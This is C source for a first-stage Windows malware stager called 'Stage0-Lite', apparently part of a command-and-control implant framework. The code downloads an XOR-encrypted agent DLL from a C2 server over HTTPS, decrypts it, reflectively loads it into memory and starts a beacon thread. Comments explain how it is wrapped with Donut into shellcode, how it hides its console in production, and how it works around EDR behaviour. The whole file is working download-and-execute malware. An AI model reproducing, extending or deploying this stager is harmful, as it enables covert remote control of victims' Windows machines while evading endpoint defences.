/*
 * stage0_lite.c — Stage0-Lite entry point
 *
 * Execution chain:
 *   ESTER → JAVELIN (in memory) → stage0_lite (in memory, this shellcode)
 *     → downloads agent_dll.dll from C2 over HTTPS
 *     → XOR decrypts
 *     → loads as in-memory PE (reflective DLL loading)
 *     → agent beacon loop starts in DllMain thread
 *
 * Design constraints:
 *   - NO Rust std / Tokio / rustls — this is plain C with WinHTTP (Schannel)
 *   - Compiled with -Os -nostartfiles for minimum binary size
 *   - Wrapped by Donut → becomes position-independent shellcode
 *   - Target: x86_64 Windows, cross-compiled from Linux via mingw-w64
 *
 * Size budget: EXE ~30-50KB → Donut shellcode ~40-65KB
 */

#include <windows.h>
#include <stdio.h>
#include "config.h"
#include "winhttp_dl.h"
#include "pe_loader.h"

/*
 * Main entry for stage0-lite (called as normal main, then Donut wraps it).
 *
 * We use a plain int return so Donut can locate the entry point reliably.
 * In production (DONUT-wrapped), the console never opens.
 */
int stage0_lite_main(void) {
    BYTE*  agent_bytes = NULL;
    DWORD  agent_size  = 0;

#ifdef STAGE0_CONSOLE
    printf("[STAGE0] Starting. C2=%s:%d (API port %d)\n",
           C2_HOST_STR, C2_PORT, API_PORT);
    fflush(stdout);
#endif

    /*
     * Step 1: Download agent_dll.dll from the C2 server.
     *
     * API_PORT is the HTTP/HTTPS port for the team-client API
     * (default 5555).  C2_HOST_STR is injected via -D at compile time.
     * The server XOR-encrypts the DLL with STAGE1_XOR_KEY and
     * prepends a 4-byte length prefix (see handlers.rs).
     */
#ifdef STAGE0_CONSOLE
    printf("[STAGE0] Downloading agent DLL from %s:%d%s\n",
           C2_HOST_STR, API_PORT, AGENT_DLL_ENDPOINT);
    fflush(stdout);
#endif

    BOOL ok = winhttp_download(
        C2_HOST_STR,
        (WORD)API_PORT,
        AGENT_DLL_ENDPOINT,
        &agent_bytes,
        &agent_size
    );
    if (!ok || !agent_bytes || agent_size == 0) {
#ifdef STAGE0_CONSOLE
        printf("[STAGE0] ERROR: winhttp_download failed (ok=%d, bytes=%p, size=%lu)\n",
               ok, (void*)agent_bytes, agent_size);
        fflush(stdout);
        Sleep(3000);
#endif
        return 1;
    }

#ifdef STAGE0_CONSOLE
    printf("[STAGE0] Downloaded %lu bytes. Loading PE...\n", agent_size);
    fflush(stdout);
#endif

    /*
     * Step 2: Reflective-load the decrypted DLL into memory.
     *
     * winhttp_download already XOR-decrypts the bytes in-place.
     * reflective_load maps the PE, resolves imports, and spawns
     * a thread calling DllMain(DLL_PROCESS_ATTACH).
     */
    ok = reflective_load(agent_bytes, agent_size);

#ifdef STAGE0_CONSOLE
    printf("[STAGE0] reflective_load returned: %d\n", ok);
    fflush(stdout);
    Sleep(2000);
#endif

    /*
     * Step 3: The agent now runs independently in its own thread.
     * We free the staging buffer and return.
     *
     * Note: do NOT free agent_bytes if the PE loader kept a reference.
     * reflective_load copies everything into a new VirtualAlloc region,
     * so the local buffer is safe to release.
     */
    LocalFree(agent_bytes);

    if (!ok) {
        return 2;
    }

    /*
     * Stage0-lite is done.  The agent thread is running independently.
     * Return 0 to let JAVELIN/Donut wrapper clean up this thread.
     *
     * Sleep briefly to give the agent thread time to initialize before
     * our thread exits (avoids process teardown race on some EDRs).
     */
    Sleep(500);
    return 0;
}

/*
 * Windows entry points — support both console (dev) and no-console (prod).
 *
 * -mwindows in the Makefile switches from WinMain to main for production.
 * For shellcode (Donut-wrapped), neither is called directly; Donut calls
 * stage0_lite_main via the PE entry point selected by -e.
 */
#ifdef STAGE0_CONSOLE
int main(void) {
    return stage0_lite_main();
}
#else
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    (void)h; (void)p; (void)cmd; (void)show;
    return stage0_lite_main();
}
#endif
